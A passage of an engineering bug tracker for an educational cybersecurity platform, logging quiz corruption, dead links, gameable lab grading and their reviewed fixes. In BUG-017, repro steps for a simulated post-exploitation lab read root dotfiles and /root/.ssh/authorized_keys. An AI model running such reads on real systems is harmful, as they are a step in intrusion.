- **Approach (operator-approved):** "All 150, checkpoint pattern" (AskUserQuestion). Extended the honest free-text checkpoint pattern (`feedback_honest_ui_lab_checkpoint_pattern`) to all 15 families: removed each ungated trigger (load-fire/click-chip/scroll), added 4 apply-to-new-input checkpoints per module behind a disabled-by-default Complete button that re-checks before `complete('code', <id>)`. Locked template + gameability scan at `_tools/marathon/upload/armory-checkpoints/`.
- **Fix:** COMPLETE + Chris PASS (not yet deployed). 18 commits: 15 family commits (JS ref 7056fcc98/25b85cc3c, c 95f83fb74, python 0539aad2e, go dcbaa0149, cpp 9e78979f6, php 507e9c81f, ruby edd719140, csharp e6fdf7f3c, rust 4489aee1b, lpr bd2c6c9f1, swift-kotlin 5a96df7ea, powershell 583812180, assembly 51c778cc0, java e878015a4, python-graphics 0d093b549) + 3 remediation (9a13b5ae8 closed 13 gameability leaks the final Chris gate caught + 3 numeric answer dedups; 0a0a6bb8a broke 5 boolean answer dups; eac0c34c8 php-01 cp4 lookup→interpolation). Every family Nancy-gated (several multi-round: java, pg, cpp, cs, php, sk); final campaign-wide Chris PASS after 3 rounds. Gameability scan 0 leaks all 15 (2 accepted font-URL FPs); duplicate-answer sweep 0/140; structural/hub-id bar 150/150. Rides next authorized hosting deploy (`./deploy.sh`).
- **Follow-ups:** task 224 (DONE — boolean dedup, folded into 0a0a6bb8a). Content bugs found in-passing: task 222 (cpp-09:238 malformed tag), 223 (lpr-07 sum comment 12024 vs 12014).
- **Related:** task 103 (this audit); feedback_honest_ui_lab_checkpoint_pattern; feedback_labs_must_be_legit_engines; project_career_os_mission (Evidence layer integrity); BUG-014 Tier 2 (same defect class, CSE labs — fixed pattern reused).

### BUG-020 — 8 topic decks call `ModuleProgress.trackVisit()` with arguments reversed  ·  P2  ·  resolved
- **Found:** 2026-07-24 · by Nancy (incidental during BUG-014 Tier 2 spec review) · CSE expose session
- **Area:** `ModuleProgress.trackVisit(houseId, moduleId, meta)` per JSDoc `_app/components/ModuleProgress.js:1228`; call sites pass `trackVisit('<topic-id>', 'cloud')` — module id first — in cloud topic decks `cloud-cse-01..05-*.presentation.html` (e.g. `cloud-cse-01-cloud-fundamentals.presentation.html:882`) and 3 shield-house decks (8 files total, cloud + shield)
- **Symptom:** `hexworth_last_visited.houseId`/`.moduleId` are swapped for anyone visiting these decks; feeds the dashboard "Continue Learning" card with a bogus house/module pairing.
- **Repro:** open any affected deck, inspect `hexworth_last_visited` in localStorage.
- **Root cause:** copy-paste of a reversed-argument call across the deck family; correct order used internally at `ModuleProgress.js:1637`.
- **Fix:** d63e188cd — all 11 broken HTML call sites corrected (8 reversed + 3 single-arg incl. funding/index.html:1788 which Nancy caught after the initial sweep undercounted). Gate: 11/11 house-first, syntax clean. Rides next authorized deploy.
- **Verified:** —
- **Related:** BUG-014 Tier 2 (new `ModuleProgress.complete('cloud', …)` calls are written adjacent to the reversed calls; implementation gate explicitly checks `'cloud'` is the first argument in each new call)

### BUG-019 — 10 house pages have duplicate `lang` attribute on root tag (`<html lang="en" lang="en">`)  ·  P3  ·  resolved
- **Found:** 2026-07-23 · by Nancy (incidental during task #208 checkAccessibility review) · marathon session
- **Area:** 10 files (code-docker.lab, script-reporting-automation.applet, clh-012/script-intro.module, script-dont-kill-the-server, script-linux-compression.lab, script-linux-links.lab, script-mission-permissions.lab, shield-linux-selinux.lab, web-packet-sniffer.applet, web-burp.tool)
- **Symptom:** root tag rendered `<html lang="en" lang="en">` — invalid HTML (duplicate attribute is a parse error) but harmless: browsers discard the second `lang`, effective DOM identical. No functional/rendering impact.
- **Root cause:** one-off past commit `ceb13a08a` (2026-02-27, "Add screen reader support ... AC-6") — an a11y batch that added `lang="en"` without guarding against an existing `lang`. NOT the current tooling: `_tools/eduscan/fixers/fix-a11y.js` fixLangAttribute is idempotent + guarded (skips any line already containing `lang=`), and the 3 page generators all emit a correct single `lang="en"` — verified no active recurrence source. (That same commit touched 14 files; 4 self-healed via later full-file rewrites, leaving these 10.)
- **Fix:** exact-string dedup `<html lang="en" lang="en">` → `<html lang="en">` in all 10 (verified 1 occurrence each; `git diff --stat` = 10 files, 1 line each, only the lang change). Nancy PROCEED (independently verified).
- **Verified:** self (git diff clean, 0 double-lang remaining) + Nancy (exact-string counts, root-cause trace, fixer idempotency, generators). Rendering effect is a provable no-op (HTML spec discards duplicate attr) — no browser test needed.
- **Related:** task #211 (this fix); task #212 (proposed EduScan duplicate-attribute HEUR rule — recurrence gate, since no validator catches this class today). Same detector-blindness family as #208 (a fake no-lang `<html>` in a lab template literal is what made the old checkAccessibility flag several of these, and likely mis-triggered the original AC-6 fixer).

### BUG-018 — deploy-check checkPaths: identical `..//assets` regex tested twice (dead copy-paste)  ·  P3  ·  resolved
- **Found:** 2026-07-23 · by Nancy (during task #208 checkAccessibility review) · marathon session
- **Area:** `_tools/nexus/adapters/deploy-check.js:166-171` (checkPaths)
- **Symptom:** two consecutive `if` blocks test the exact same regex `/\.\.\/\/assets/` under two different messages ("double-slash path (..//assets/)" and "double-slash in asset path"). A file with that pattern gets flagged twice; the second block is dead redundancy. No functional harm (over-reports, never under-reports), pure hygiene.
- **Root cause:** copy-paste duplication when the check was written.
- **Fix:** removed the dead second block; `node --check` clean. Tooling only (_tools/nexus/), no deploy. Committed this session.
- **Related:** task #208 (deploy-check comment/string-blindness sweep, where this was incidentally found).

### BUG-017 — da-linux-post-exploitation: /root/.bashrc + /root/.ssh/authorized_keys listed in `ls` but `cat` fails (phantom files)  ·  P3  ·  fixed-not-deployed
- **Found:** 2026-07-23 · by Nancy (during task #104 design v2 review; became task #205) · marathon session
- **Area:** `_app/dark-arts/vault/labs/linux/da-linux-post-exploitation.lab.html` (the `LinuxTerminal.addFilesystem({...})` overlay in the main inline `<script>`)
- **Symptom:** the lab's `/root` dir node lists `.bashrc` in its `children`, and `/root/.ssh` lists `authorized_keys`, but neither had a matching fs file-node. `ls -la /root` / `ls /root/.ssh` show the names, but `cat` (and `stat`/`wc`) fail on them — a file that appears to exist but can't be opened. Contained: the lab's objective grading is command-string based (`t.validate(c)` on the typed command), so completion/scoring is unaffected; the flaw is realism/exploration hygiene only. No student data or grading impact.
- **Repro:** open the lab, run `ls -la /root` then `cat /root/.bashrc` (and `cat /root/.ssh/authorized_keys`).
- **Root cause:** `.bashrc` is a REGRESSION from task #104 (`baf4ccadd`): the root-home prune at `LinuxTerminal.js:4003-4011` deletes base-seeded `/root/*` keys (base seeds `/root/.bashrc` via the home template, line 104/123) that a lab's `/root` overlay does not itself redefine — this lab claimed `/root` without reseeding `.bashrc`. `authorized_keys` is a pre-existing pure-lab phantom (base never seeds `.ssh` for root). Scope-check: among the 6 root-session `/root`-overlay labs (5 shield-linux + this one), only this lab was affected; the 5 shield labs reseed every `/root` child. Non-root labs are NOT pruned (base seeds their home dotfiles via plain merge), so the broad ~134-candidate crude scan was ~98% false positives.
- **Fix:** seeded both file-nodes in the overlay (`/root/.bashrc` size 237 with a realistic escape-free bashrc; `/root/.ssh/authorized_keys` size 134 with one pre-existing key line). `size` == real `content.length` (engine uses `node.size` for `ls -l`/`stat`, `content.length` for `wc -c`). Verified: edited `<script>` compiles clean (no `\u` SyntaxError), actual engine prune+merge simulated → 0 phantoms remain, both files reachable. Nancy PROCEED (2nd pass, independently re-verified).
- **Verified:** self (static: compile + engine prune trace + size recompute) + Nancy (re-derived sizes, recompiled script, re-enumerated the 6 root-overlay labs). Not browser-rendered (per CLAUDE.md acceptable bar when browser unavailable).
- **Related:** task #104 (`baf4ccadd`, root-home prune — introduced the `.bashrc` case); taskboard #205 (this fix), #210 (proposed base-aware LinuxTerminal phantom-child EduScan heuristic — the systemic gate so future `/root`-overlay labs can't reintroduce this class).

### BUG-016 — bm-* hardware course: one answer-position template across all 8 quizzes, no render shuffle  ·  P2  ·  resolved
- **Found:** 2026-07-23 · by self (QUIZ-DUP cluster QC, primary-agent derivation after Karl declined) · marathon session
- **Area:** `_app/houses/forge/hardware-support/quizzes/bm-*.quiz.html` (8 files, CTS1150C "Bare Metal"); keys in `functions/quiz_keys.json` + Firestore
- **Symptom:** all 8 quizzes share the exact correct-answer position template `[3,2,2,1,2,2,1,1,1,0,0,0,0,3,3]` AND render options in authored order (hand-rolled pages, zero shuffle — verified `Math.random` count 0 in all 8). A student who notes week-1's letter pattern (D,C,C,B,C,C,B,B,B,A,A,A,A,D,D) can ace the remaining 7 without knowledge. Grading itself is CORRECT (120/120 explanation-derived, audit `~/hexworth-shared/Solutions/_audit/qc-quizdup-cluster6-2026-07-23.md`).
- **Root cause:** authoring template reused per week; page pattern predates QuizEngine QC-8 enforced shuffle.
- **Fix:** d01cf42fe — permShuffleQuiz render-shuffle ported to all 8 bm-* pages + cb-w4-troubleshoot (option chosen: hosting-only, no Firestore write; server key stays canonical, gradeOne submits original indices via q._perm). Nancy PROCEED. Residual: `md101-m08` longest-option cue (different cue class, not fixed by shuffle) — still open under this bug.
- **Related:** feedback_assessment_testing_standard; contrast fw-w*/pis-w* (same template but shuffled at render — no exposure).

### BUG-015 — 7bc9a158b apostrophe-mangling extends beyond CSE: cloud-ch09-database Q5 options corrupted  ·  P1  ·  resolved
- **Found:** 2026-07-23 · by QC agent (QUIZ-DUP cluster-3 derivation) + corpus signature sweep · marathon session
- **Area:** `_app/houses/cloud/quizzes/cloud-ch09-database.quiz.html:117-124` (Q5, Aurora)
- **Symptom:** Q5 renders 5 mangled options (`'It'`, `','`, `'t support SQL queries'`, ...) — the CORRECT option ("It provides up to 5x better performance through cloud-native architecture") is absent from the page. WORSE than display-only (Nancy): QuizEngine submits via `_originalOptions.indexOf(selectedText)`, and the corrupted array has DUPLICATE `'It'` strings at positions 1 and 4, so clicks on either resolve to index 1 — a silent mis-grader, not just a rendering glitch. 0 recorded attempts on `ch09-database` (independently confirmed by live read-only Firestore count 2026-07-23), so no student harm occurred.
- **Repro:** open the quiz, view Q5 options.
- **Root cause:** same apostrophe-eating restore-era regex as BUG-014's 4 CSE corruptions (one-shot commit family 7bc9a158b — not a recurring pipeline; no tool in `_tools/` re-runs that transform). Original intact at `git show be39cb329`. Note: an UNcorrupted, unserved mirror also exists at `_output/migrated-quizzes/cloud/quizzes/cloud-ch09-database.quiz.html` (`_output/` is not in `firebase.json` public root; do not "fix" it, and no migration script syncs it back).
- **Fix:** Q5's 4 original options restored verbatim in current (server-graded) format — Nancy PROCEED; post-edit whole-file check: brackets balanced, 10 questions × 4 options, 0 fragments. Key value 1 already correct, no reseed needed. **Scope-check RESULT (Tier-5 item from BUG-014):** corpus fragment-detector over all `_app` options arrays => exactly 3 affected files: `cloud-cse-module02.quiz.html` (3 fragments), `cloud-cse-module03.quiz.html` (3), this file (4). No corruption elsewhere; EHE lab hits were ASCII-banner false positives.
- **Deployed+Verified:** 2026-07-24 — fix shipped with the BUG-014 Tier 6 deploy (full _app surface); live curl confirms the correct Aurora option present on prod.
- **Related:** BUG-014 (CSE fixes awaiting operator tier approvals).

### BUG-014 — `'cse'` LearningPath (EC-Council Cloud Security Engineer) fully defined but dark — expose-or-remove decision  ·  P3  ·  resolved
- **Found:** 2026-07-22 · by Nancy · during BUG-013 review (CLF-C02 course-build session); split out of BUG-013 at its resolution 2026-07-23 so the decision doesn't get buried in Resolved
- **Area:** `_app/components/LearningPaths.js:3139` `'cse'` path definition; absent from `_app/houses/cloud/index.html`'s `paths` array
- **Symptom:** the `'cse'` LearningPath is fully defined with its own `courseHref`/`PATH_HOUSE_MAP` entry but is NOT exposed anywhere in live nav — a half-built cert path sitting dark in the same file.
- **Root cause:** path built but never QC'd, so never exposed. QC (2026-07-23/24) found: 4 corrupted questions (Tier 1, one actively mis-grading), 7 unanchored/fabricated content items (D1-D7 incl. a fabricated MS citation and a self-contradicting "four pillars" pair), 5 unconditional + 3 missing lab completion mechanisms, 2 static labs with zero demonstrated work, page-load auto-credit on 3 decks, hub tracker dead 24/25, all 16 keys skewed to index 1, 3 solution pages mislabeled Shield documenting orphan quizzes.
- **Fix:** operator chose EXPOSE, full QC-then-fix chain 2026-07-23/24 (task #194): Tier 1 restore 2e844db8c; D-series c004e7dd7 1fe69f1cc b52f53b27 c3282566d 4e73d9775 49883232c e37064fd7 (evidence rule: "if we cannot provide evidence it is wrong"); Tier 2 654ccae42 32ee740ca 4ddb01c05 9309351ae 4d2d75f3f; Tier 3 rebalance+reseed 849f0ce55 eff13cd7f; Tier 6 expose 3c92f0d3a. All Nancy-gated (multiple BLOCKs caught real defects), Karl citation audits, Chris deploy PASS. Deployed 2026-07-24 via ./deploy.sh (all gates green), pushed to origin.
- **Verified:** live post-deploy — C|CSE card on house page, hub 200, live quiz HTML aligns with reseeded live keys (spot-checks MATCH); 16/16 verify-quiz-keys.js PASSED; zero historical attempts (receipt: cse-qc/task215-zero-attempts-receipt.json) so no regrades.
- **Follow-ups (open, tracked):** task 218 (76 solution rationales pending content pass; 8 module Confluence pages held for Karl citation re-audit), task 219 (cse-08 Q8 wording), tasks 220/221 (Karl advisories: constraint-aware per-quiz reshuffle defense-in-depth; architecture-doc rule-6 scoping), BUG-020/task 217 (reversed trackVisit args, separate bug).
- **Related:** BUG-013 (origin, Resolved) · BUG-020 (found during this fix).

### BUG-012 — Dead internal links across _app (59 broken .html hrefs/redirects)  ·  P2  ·  in-progress (9 path-fixes shipping; clusters need decisions)
- **Found:** 2026-07-22 · by self (full-site dead-link scan) · in "continue easy work" session
- **Area:** 24 files link/redirect to local `.html` targets that don't resolve on disk (scan: 5,181 files / 13,854 local .html links → 59 dead instances)
- **Symptom:** students hit 404s on lab-completion redirects and hub navigation.
- **Triage / buckets:**
  - **(A) FIXABLE-NOW path-depth bugs (9, evidence-proven, shipping this session):** 4 forge labs JS redirect `'../../dashboard.html'`→`'../../../dashboard.html'` (root dashboard exists; proven by same-file `<a>` back-btn) — `forge-admin-tools`/`-control-panel`/`-system-tools`/`-windows-settings`.lab.html; and 5 key/script completion redirects `'../../index.html'`→`'../index.html'` (house hub exists; script-clh-031 has same-file proof, 4 key pages match the 31-sibling canonical) — `key-attack.lab`, `key-cryptanalysis/-derivation/-post-quantum.presentation`, `script-clh-031.lab`.
  - **(B+C) RESOLVED via COMING-SOON GATE (operator "get it done" 2026-07-22).** Both are incomplete content builds, NOT navigation bugs: **(B)** `houses/forge/intro-computers/index.html` = Keiser **CGS1000C "First Boot"** (Intro to Computers, 4-week), a course whose index build crashed mid-way (`63179a5bb`); 3 of 26 pieces built, 23 unbuilt (wk1 labs/quizzes + wk2-4). **(C)** `houses/shield/isc2-cc/index.html` = ISC2-CC cert hub, **~81% built (47/58)**, 11 unbuilt `pis-01..20` modules (the served `pis-r1..r5` are a *different* review series, NOT a remap).
    - **THE GATE — what/where/how:** a self-contained `<style>`+`<script>` block appended before `</body>` in EACH of the two hub files. On load it reads a hardcoded `COMING_SOON` array of not-yet-built hrefs, and for each matching `a.content-card[href=…]`: adds class `is-coming-soon` (dims to 0.5 opacity), appends a monospace **"Coming soon"** `.cs-badge`, and intercepts the click (`preventDefault` + `alert('This module is coming soon.')`) so a student never hits a 404. Built cards are untouched and navigate normally. Purely additive — no existing markup changed; forge hub's week-lock still hides wk2-4 independently.
    - **TO UN-GATE (as each module ships):** delete that module's href string from the `COMING_SOON` array in the hub file — nothing else. When a full course/hub is completed, remove the whole gate block.
    - **Verified:** `_tools/eduscan/smoke/coming-soon-gate-verify.js` (headless, stubs auth/Firebase) — isc2-cc 11 gated+badged, intro-computers 23 gated+badged, built sample card still navigates, gated click blocked, 0 page errors; screenshot QC'd (CGS1000C: built presentations live, unbuilt labs/quizzes show COMING SOON).
    - **The actual content-build (23 CGS1000C pieces + 11 PIS modules) remains real work** for the course-build pipeline / [[project_cert_hub_wip]] — the gate is the honest, reversible interim, not a substitute for building.
    - **MAINTENANCE / drift risk (Nancy flag):** `COMING_SOON` is a manual array with NO enforcement — if a module ships and its href is NOT removed, a *built* module gets permanently mislabeled "Coming soon" with a blocking alert (worse than a 404, looks deliberate). This repo has a documented history of exactly this manual-list drift. FOLLOW-UP (not blocking deploy): wire `_tools/eduscan/smoke/coming-soon-gate-verify.js` — or a simpler "every COMING_SOON href must NOT exist on disk, every non-gated content-card href MUST exist" check — into a recurring/CI gate so shipping a module without un-gating it fails loudly. Also: the gate protects only these two hub PAGES' own cards, not bookmarked/shared direct links or other pages linking the same 34 unbuilt hrefs; and isc2-cc carries a coupling note (ContentDiscovery.js would bypass the gate if ContentCatalog.js is ever added there).
  - **(A2) DEPLOYED live 2026-07-22 (`b8c5ff566`):** `matrix/protocore/index.html` linked `sg-103-t-display-s3-setup.html` + `sg-105-wifi-recon-scanner.html` (both 404); Signal files were renamed → corrected to `sg-103-s3-setup.html` + `sg-105-wifi-recon-s3.html` (canonical per `signal/SignalData.js:1868,1870`; href-only, labels untouched). Nancy PROCEED + Chris PASS; live-verified (fixed present, 0 broken). All 9 protocore signal links now resolve.
  - **(D) Scattered singles — RESOLVED 2026-07-22 (operator "gate the bucket-D singles too"):** 8 files fixed so no student hits a 404.
    - **5 SCAN FALSE POSITIVES dismissed** (scanner matched hrefs inside `<code>`/`//`-comments/JS-strings, not clickable links): `admin/console.html`→`...index.html` (doc-table example text); both `page-2.html` hits (`darkarts-web-scraping`/`script-web-crawler` — web-scraping teaching content/log samples); `code-git-basics.presentation`→`git-quiz.html` (inside a `// In production, this would navigate to…` comment); `arena/tournament-board.html`→`'/arena/boxes/'+ch.boxId+'/index.html'` (JS template literal).
    - **3 JS-navigation fixes:** `script-python-exam-chapter8.exam.html` `closeModal()` was navigating to the missing `python-course.html` → now hides the completion modal in place (real fix; modal already has working Return/Review links). `key-encryption-basics.presentation.html` `startQuiz()` → coming-soon `alert()` (encryption-quiz unbuilt). `python-engineering/index.html` course-complete "View Certificate" button set a dead `code-pye-certificate.module.html` href → now `removeAttribute('href')` + coming-soon `onclick` (in-progress branches untouched, still link real modules).
    - **1 REMAP (Nancy caught a misclassification — was NOT unbuilt):** `divergent/ethics-it/eth-r3.html` "ETH-01: Overview of Ethics" nav link pointed at bare `eth-01.html` (404), but the real module is LIVE at `presentations/eth-01-overview.presentation.html` (matching title). Fixed as an href remap, NOT gated — an earlier coming-soon gate on this file was reverted since gating would have hidden live content from students.
    - **4 anchor coming-soon gates** (appended `<script>` IIFE, per-file `COMING_SOON` list, `aria-disabled` + click-intercept notice, generic `a[href=X]`): `code/incubator`→`games/pod-crossing.html`; `pfi-w4-gui-classroom` + `pfi-w4-gui.presentation`→`../quizzes/pfi-w4-gui.quiz.html`; `projects/divergent-field-terminal`→3 `divergent/districts/{embedded,wireless,networking}/index.html`.
    - **Verified:** all gated/redirect targets confirmed non-existent on disk (eth-r3's remap target confirmed to EXIST); headless check on divergent-field-terminal (6 anchors gated, click blocked) PASS; diff 105 ins / 4 del across the 8 files. Nancy PROCEED (caught the eth-r3 remap misclassification + a `continueBtn.onclick=null` cert-button hardening, both applied), Chris PASS. **DEPLOYED live 2026-07-22** (`851999d5d`); all 8 live-verified (eth-r3 remap target HTTP 200, closeModal hides modal, 4 gates + JS notices present). Post-verify flagged a transient smoke FAIL on an unrelated PIS lab — re-ran smoke twice, 10/10 PASS, confirmed transient. **Un-gate:** delete the href from that file's `COMING_SOON` (or restore the JS redirect) once the content ships. **Scan caveat:** future dead-link scans should skip hrefs inside `<code>`/`<pre>`/`//` comments/JS strings.
  - **(E) Nancy-flagged during bucket-A review (log, not fixed):** (1) `houses/script/courses/clh/modules/clh-031/script-lab.lab.html` has `location.href='../../index.html'` at 4-deep → resolves to `houses/script/courses/index.html` (also missing; likely a stale duplicate of script-clh-031 — different depth delta than bucket A, so NOT swept in). (2) `houses/script/clh/script-clh-031.lab.html` lines 1022/1380 have malformed `onclick="location.href="../index.html""` (nested unescaped double-quotes truncate the attribute) — pre-existing, unrelated to the redirect fix, left untouched to avoid scope creep.
- **Fix:** bucket A (9 files) **DEPLOYED live 2026-07-22** (`a7659b336`, Nancy PROCEED + Chris PASS, post-verify 5/5 green); each redirect verified to resolve to a real page (root `dashboard.html` / house `index.html`), live-spot-checked (fixed strings present, 0 broken); the 2 deeper script applets that *correctly* use `../../index.html` were confirmed untouched. Buckets B/C/D/E await operator decisions (build vs coming-soon-gate vs trim vs remap vs dedup).
- **Related:** same class as #157 (dark-arts vault dead CTA, resolved). Scan is reproducible.

### BUG-011 — 4 adv-linux module ids absent from BOTH content registries (HUB-001)  ·  P2  ·  open (two-registry sync)
- **Found:** 2026-07-21 · by triage (scan); scope corrected by Nancy 2026-07-22
- **Area:** `_app/components/ContentCatalog.js` AND `_app/components/LearningPaths.js` — the adv-linux hub tracks 4 `data-module` ids (`ala-hunt1-website-down`, `ala-hunt2-perimeter-open`, `ala-hunt3-lost-authority`, `ala-final-practical`, all real content) that are in NEITHER registry.
- **Symptom:** ContentCatalog gap → completion state untracked. LearningPaths `'adv-linux'.modules[]` gap → the 3 hunts + final practical are absent from `path-view.html`'s roadmap, path duration is short, and `getNextModule` walks past them.
- **Nancy finding (why the first attempt was reverted):** a ContentCatalog-only patch (drafted 2026-07-22, then REVERTED off master before deploy) is HALF a fix — it repeats the "one registry updated, one forgotten" mistake this codebase has been burned by (`7d39393a1`). The two registries also have DIFFERENT membership (LearningPaths omits the lecture modules the hub uses as sequence anchors), so the hunts must be placed against LearningPaths' actual prerequisite chain, not the hub's order.
- **Fix (pending, do together):** add the 4 to ContentCatalog **and** to LearningPaths `'adv-linux'.modules[]` at the correct sequence position with rewired `prerequisites` (insert + repoint the following module), then verify `path-view.html` renders them. Hub canonical order: hunt1 after `ala-w1` block, hunt2 before `ala-midterm`, hunt3 before `ala-w4`, final-practical after `ala-final`.

### BUG-010 — `validateFlag` rejects trailing-dot FQDN answers  ·  P2  ·  open
- **Found:** 2026-07-21 · by triage · in backlog item 8
- **Area:** `functions/index.js` `validateFlag` (~:223/231/251) — only `.trim().toLowerCase()`, no trailing-dot normalize
- **Symptom:** DNS/recon boxes: a student who pastes `ns1.example.` (dig prints the trailing dot) mismatches the stored `ns1.example` → wrong-flag penalty for a correct answer.
- **Fix:** pending — strip a single trailing `.` on FQDN-shaped answers before compare.

### BUG-009 — Honor-click Jeopardy: self-judged, no answer check (shared engine + siblings)  ·  P2  ·  open (operator scope decision)
- **Found:** 2026-07-21 · by triage · in backlog item 26
- **Area:** shared `_app/_games-lab/jeopardy.html` (`judgeAnswer(true)` on "I Got It Right", ~:581,1004) + 5 sibling forge review files (e.g. `eth-jeopardy.review.html:979`). The `accepts:[]` auto-grading upgrade only reached `forge-aplus-jeopardy.applet.html`.
- **Symptom:** solo player reveals a clue and self-marks correct with zero answer validation. Low-stakes (review game, not a graded exam), but an integrity gap.
- **Decision:** scope — fix the shared engine + ~5 siblings, or accept honor-mode for review games. Operator call. (Related: `forge.mjs mapJeopardy` drops `accepts` on re-run — BUG-cluster P3 below.)

### BUG-008 — Grading honesty: Armory + da-linux labs grant credit on command TEXT, no success check  ·  P2  ·  open (sweep-scale)
- **Found:** 2026-07-21 · by triage · in backlog item 12 (= marathon Lane-A item 4)
- **Area:** `_app/houses/code/armory/**` (~20: arm-bash/sql/c-*) + `_app/houses/dark-arts/**` (23 `da-linux-*`). Example `arm-bash-01-intro.module.html:511-515,555` — `completeTask` fires on `cmdLine.includes(...)` alone (grep `lt-error` across armory = 0 files), then `ModuleProgress.complete('code','arm-bash-01-intro')` grants real credit.
- **Symptom:** `chmod +x nonexistent.sh` completes the task though nothing was chmod'd. Same honesty class as the LM-1 sweep.
- **Nuance:** intro modules MAY intend command-shape pedagogy (per LM-1) — needs per-module practice-intent judgment, not a blanket wire-in of `ok`. Sweep-scale.
- **Fix — arm-bash phase: DEPLOYED + LIVE 2026-07-22 (`8a505c12a`):** honesty `ok`-gate (`!(output||'').includes('lt-error')`) applied to the verified-clean tasks across arm-bash-01/02/03/07/08/09. Real-engine keeper harnesses `_tools/armbash-honesty-test.js` (24 cases, literal TASK_INSTRUCTIONS strings; `chmod +x` missing-file + `sedd` command-not-found stay BLOCKED) + `_tools/armbash-honesty-seq-test.js` (full sequential student flow). Nancy PASS (2 rounds — caught + fixed: piped/redirected instructed commands were unreachable via `cmd===X`, fixed with a command-position regex; `stderr` un-gated as an error-teaching task; dead `let` branch removed). Chris PASS. Deployed via `deploy.sh` (10/10 smoke, post-verify PASSED); live-verified gate present in production.
- **Fix — arm-sql phase: HELD ON BRANCH `armsql-honesty-wip` (commit `a6c03695e`), NOT deployed (2026-07-22).** The honesty-gate mechanism + `SQLEngine.js` engine bug fixes are sound and verified (Nancy confirmed the mechanism twice), but arm-sql CONTENT is systemically broken and needs a dedicated REBUILD before this can ship. **Engine bugs found+fixed (real, on the branch):** (a) `_parseValueList` mis-parsed quoted INSERT values (`'a','b',1`→5 values) → EVERY quoted-string INSERT failed; (b) 0-row `UPDATE`/`DELETE` rendered unconditional success → no-op earned credit; (c) `GRANT`/`REVOKE` weren't in `SQL_LEAD_WORDS`/had no handler → never reached the engine; (d) `MIN`/`MAX` numeric-only → returned 0 on TEXT (timestamps); (e) missing seed: `network_logs` table + `users.password_hash`. **BLOCKER (why held):** the runnable worked-example CANNED OUTPUTS are FABRICATED in **11/12 boxes** — they print an imaginary larger dataset (2026 dates, `COUNT=847`, `142` fails) vs the real 12-row/2024 seed, so a student clicking Run sees the real result contradicting the printed one. That's a content-authoring rebuild (all modules), not a gate patch. Full position: `_docs/operations/armsql-honesty-wip-status.md`. See [[project_marathon_backlog]].
- **Fix — remaining:** arm-bash-04/05/06/10 (conditionals/loops/functions/advanced) PINNED — the LinuxTerminal engine can't execute bash *language constructs*; needs a C1(engine-build)-vs-C2(module-rewrite) decision. **arm-sql-10 PINNED** (gate reverted, matches HEAD) — needs a CONTENT REBUILD not a gate: its schema-reference box is fabricated for all 4 tables and its incident IP `192.168.1.99` exists in no seed table (Nancy 2026-07-22). Plus 23 da-linux (most already outcome-gated).
- **RESIDUAL GAPS (Nancy, accepted tradeoffs — tracked not fixed):** (1) engine `grep`/read-commands don't emit `lt-error` on a missing FILE, so `grep /nope` still passes — same class as the 2026-07-08 cp engine fix; gate catches command-not-found + reported errors only. (2) the command-position regex matches RAW typed text, so `echo "... | sed ..."` (sed inside quoted text) would credit sed — forced because the engine flattens a piped `cmd` to `'pipe'` and exposes no per-segment tokens. (3) `stderr` un-gated is maximally permissive (`xyz 2>/dev/null` completes it) — engine can't distinguish an expected redirect-error from a typo. (4) engine `2>` is split on bare `>` (not parsed as one token) so stderr isn't actually suppressed. 1+4 are engine fixes (own Nancy/verify); 2+3 resolve if 1/the-flattening is fixed.

### BUG-CLUSTER-P3 — 2026-07-21 triage P3 tail (cosmetic / latent / low-value)  ·  P3  ·  open (batch when convenient)
- **DONE 2026-07-22 (batched hosting fixes, DEPLOYED live via `./deploy.sh`, Nancy PROCEED + Chris PASS, post-verify 5/5 green):** item 9 Dark-Arts Five-Gates→Vault CTA — now shows a "coming soon" notice instead of navigating to the unbuilt `vault/index.html` (`dark-arts/index.html` `updateVaultStatus`, matches the interceptor UX). · item 23 cloud-iam-debugger case-sensitive action match — `globToRegex` gained a `flags` param; `actionMatches` now passes `'i'` (AWS actions are case-insensitive); `resourceMatches` deliberately unchanged (ARNs case-sensitive). Verified in node.
- **DONE 2026-07-22 (item 7 — actually 6 files, not 24; the "×24" was the raw HTML-011 emission count):** the 6 cyberops applets that opened tab panels with `<section id="X" class="co-tab-content...">` but closed each with `</div>` (4 unclosed `<section>` + 4 orphan `</div>` per file) — converted the 4 panel opens per file `<section ...>`→`<div ...>` to match the 37 working sibling applets (which use `<div class="co-tab-content">`; JS/CSS target the class + `getElementById`, never the tag, so behavior-preserving). Files: `eye-5-tuple-approach`, `eye-attack-surface`, `eye-data-loss-traffic`, `eye-data-types-output`, `eye-data-visibility`, `eye-detection-methods` (`.applet.html`). Verified: real EduScan HTML validator now 0 HTML-011/012 on all 6 (pre-fix fired 4× each); browser render harness `_tools/eduscan/smoke/cyberops-tab-render.js` 6/6 PASS (4 sibling DIV panels, tabs switch, 0 errors) + visual spot-check. Nancy PROCEED, Chris PASS (both independently re-verified). **DEPLOYED live 2026-07-22** (`9a7b989f8` via `./deploy.sh`); all 6 verified live (0 `<section id=`, 4 co-tab-content div panels each). Post-verify flagged a transient `ERR_HTTP2_PROTOCOL_ERROR` on the unrelated `pis-l09` lab (my change touched only eye/cyberops) — re-ran the smoke twice, 10/10 PASS both times, confirmed transient; Confluence inventory regen skipped that cycle (cosmetic).
- **VERIFIED-RESOLVED-IN-CODE 2026-07-22 (item 24 — no change needed, tracker was stale):** cloud-iam-debugger Round-8 encryption null-check is already correctly implemented AND documented — `conditionSatisfied()` handles a MISSING context key per operator (StringNotEquals → satisfied; StringEquals/Bool/IpAddress → not satisfied), with a full explanatory comment block, and Round 8's `explanation` already states "a missing encryption header is treated as 'not AES256'". Simulated the engine against Round 8's intended-fix policy + all 3 testCases: PutObject+AES256→Allow, PutObject+{}→Deny, GetObject+{}→Deny — all correct.
